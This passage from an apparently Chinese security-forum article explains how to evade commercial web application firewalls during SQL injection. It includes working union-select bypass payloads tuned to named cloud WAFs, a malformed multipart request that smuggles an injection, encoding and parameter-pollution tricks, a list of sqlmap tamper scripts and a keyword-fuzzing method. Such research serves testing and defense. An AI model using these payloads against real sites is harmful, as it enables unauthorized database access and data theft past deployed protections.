    %c0%29
    %c0%a9
    %e0%80%a9
  * 畸形协议&请求：
asp/asp.net： 还有asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式，不管是GET还是POST，都可正常接收，过滤GET请求时如果没有对application/x-www-form-urlencoded提交数据方式进行过滤，就会导致任意注入。
php+Apache：
waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没有那么严格，当我们将协议随便定义时也是可以的：
PHP解析器在解析multipart请求的时候，它以逗号作为边界，只取boundary，而普通解析器接受整个字符串。
因此，如果没有按正确规范的话，就会出现这么一个状况：首先填充无害的data，waf将其视为了一个整体请求，其实还包含着恶意语句。
    ------,xxxx
    Content-Disposition: form-data; name="img"; filename="img.gif"
    GIF89a
    ------    Content-Disposition: form-data; name="id"
    1' union select null,null,flag,null from flag limit 1 offset 1-- -    --------    ------,xxxx--
通用的特性：
  * HPP：
HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。
假设提交的参数即为：
`id=1&id=2&id=3`
    Asp.net + iis：id=1,2,3
    Asp + iis：id=1,2,3
    Php + apache：id=3
  * 双重编码：
这个要视场景而定，如果确定一个带有waf的site存在解码后注入的漏洞的话，会有效避过waf。
    unlencode
    base64
    json
    binary
    querystring
    htmlencode
    unicode
    php serialize
  * 我们在整体测试一个waf时，可测试的点都有哪些？
GET、POST、HEADER那么我们专门针对一个waf进行测试的时候就要将这几个点全测试个遍，header中还包括Cookie、X-Forwarded-For等，往往除了GET以外其他都是过滤最弱的。
#### 0x03 见招拆招
“正则逃逸大法”：或许大家没听说过这个名词，因为是我起的。我发现很多waf在进行过滤新姿势的时候很是一根筋，最简单的比方，过滤了%23%0a却不过滤%2d%2d%0a？上面提到八成的waf都被%23%0a所绕过。
科学计数法1union、1from？多次被坑的安全宝&百度云加速&Imperva：
过滤了union+select+from，那我select+from+union呢？使用Mysql自定义变量的特性就可以实现，这里举一个阿里云盾的案例：
由于后面在调用自定义变量的时候需要用到union+select，所以还需要绕过这个点。/ _ddd_ /union/ _ddd_ /select 就可以了。
Bypass Payload：
如何做到通过推理绕过waf？这里举一个腾讯云安全的案例：
绕过思路: 首先看看腾讯云安全怎么检测sql注入的，怎么匹配关键字会被拦截，怎么匹配不会?
  * union+select拦截
  * select+from拦截
  * union+from不拦截
那么关键的点就是绕过这个select关键字
  * select all
  * select distinct
  * select distinctrow
既然这些都可以，再想想使用这样的语句怎么不被检测到？select与all中间肯定不能用普通的`/**/`这种代替空格，还是会被视为是union+select。select
all可以这么表达`/*!12345select all*/`，腾讯云早已识破这种烂大街的招式。尝试了下/ _!_ /中间也可以使用%0a换行。
`*!12345%0aselect%20all*/`还是会被拦截，这就说明腾讯云在语法检测的时候会忽略掉数字后面的%0a换行，虽然属于union+12342select，但简单的数字和关键字区分识别还是做得到。再测试`/*!12345select%0aall*/`，结果就合乎推理了，根据测试知道腾讯云安全会忽略掉%0a换行，这就等于union+12345selectall，
不会被检测到。（忽略掉%0a换行为了过滤反而可以用来加以利用进行Bypass）
可能会问，推理的依据并不能真正意义上证明忽略掉了%0a啊？当然要证明下啊，`/*!12345%0aselect%0aall*/`
就被拦截了，说明刚开始检测到12345%0aselect就不再检测后方的了，union+12345select就已经可以拦截掉了。
还可能会问，既然忽略掉了%0a，那么/ _!select%0aall_ /是不是也可以啊，然而并不行。合理的推理很有必要。
Bypass Payload:
    1' union/*!50000select%0aall*/username from users%23
    1' union/*!50000select%0adistinct*/username from users%23
    1' union/*!50000select%0adistinctrow*/username from users%23
不是绕不过狗，只是不够细心：
    union+select拦截。
    select+from拦截。
    union+from不拦截。
    fuzz了下/*!50000select*/这个5位数，前两位数 ascii
127的字符，会导致waf引擎无法检测。
我是个技术人，虽然这是异想天开没有任何根据的想法，但仍愿意去尝试。courage to try！
#### 0x06 自动化Bypass
首先总结下sqlmap的各种bypass waf tamper：
    apostrophemask.py 用UTF-8全角字符替换单引号字符
    apostrophenullencode.py 用非法双字节unicode字符替换单引号字符
    appendnullbyte.py 在payload末尾添加空字符编码
    base64encode.py 对给定的payload全部字符使用Base64编码
    between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
    bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
    chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
    charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）
    charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
    concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
    equaltolike.py 用“LIKE”运算符替换全部等于号“=”
    greatest.py 用“GREATEST”函数替换大于号“>”
    halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释
    ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
    lowercase.py 用小写值替换每个关键字字符
    modsecurityversioned.py 用注释包围完整的查询
    modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询
    multiplespaces.py 在SQL关键字周围添加多个空格
    nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器
    overlongutf8.py 转换给定的payload当中的所有字符
    percentage.py 在每个字符之前添加一个百分号
    randomcase.py 随机转换每个关键字字符的大小写
    randomcomments.py 向SQL关键字中插入随机注释
    securesphere.py 添加经过特殊构造的字符串
    sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
    space2comment.py 用“/**/”替换空格符
    space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符
    space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
    space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
    space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
    space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符
    space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
    space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符
    space2plus.py 用加号“+”替换空格符
    space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
    unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”
    unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符
    varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF
    versionedkeywords.py 用MySQL注释包围每个非函数关键字
    versionedmorekeywords.py 用MySQL注释包围每个关键字
    xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
看起来很全，但有个缺点就是功能单一，灵活程度面对当今的主流waf来说很吃力了。
鉴于多数waf产品是使用Rule进行防护，那么这里也不提什么高大上的机器学习。就是简单粗暴的fuzz。
提到系统的训练，鉴于多数waf产品是使用Rule进行防护，那么这里不说什么机器学习。来点简单粗暴有效果的修复方案：我把每个sql关键字比喻成“位”，将一个“位”的两边进行模糊插入各种符号，比如注释（#
— /**/）、逻辑运算符、算术运算符等等。
15年黄登在阿里云安全峰会提到的fuzz手法通过建立一个有毒标识模型，将将其插入到各种“位”，测试其waf。
在这基础上其实可以在更加全面的建立模型。因为我发现一个问题，常规绕过姿势都会被拦截。但是呢，稍加fuzz下其他“位”，做一些变通就又能绕过。最基本的一句注入语句就有这些位：
最常见的四种sql注入语句：select、update、insert、delete
    有毒标识定义为n
    “位”左右插入有毒表示那么就是x的n次幂
    而且其他数据库也各有各的语法糖，次数量定义为y
    如果再将其编码转换定位为m
    其结果最少就得有：
    Factor[((x^n)*4 + x*y)*m]
通常waf引擎先转换m后再去匹配，这个还是要看场景。还有关键字不止这些，稍微复杂一点的环境就会需要更多的关键字来注入，也就会需要fuzz更多的位。还没说特殊字符，根据系统含有特殊意义的字符等等，也要有所顾忌。
当前几个关键字达到绕过效果时，只需继续fuzz后面几个位即可。 还有就是传输过程中可测试的点：
因为当我们在传输的过程中导致的绕过往往是致命的，比如中间件的特性/缺陷，导致waf不能识别或者是在满足特定条件下的欺骗了waf。
#### 0x07 End
一写起来就根本停不起来，后期决定出一系列waf绕过文，例如文件上传、webshell防御、权限提升等Waf绕过。xss的bypass就算了，防不胜防…（如果又想到什么有趣的手法的话，我会以下面回帖的方式给大家）
[wafbypass_sql.pdf下载](https://xianzhi.aliyun.com/forum/attachment/big_size/wafbypass_sql.pdf)
* * *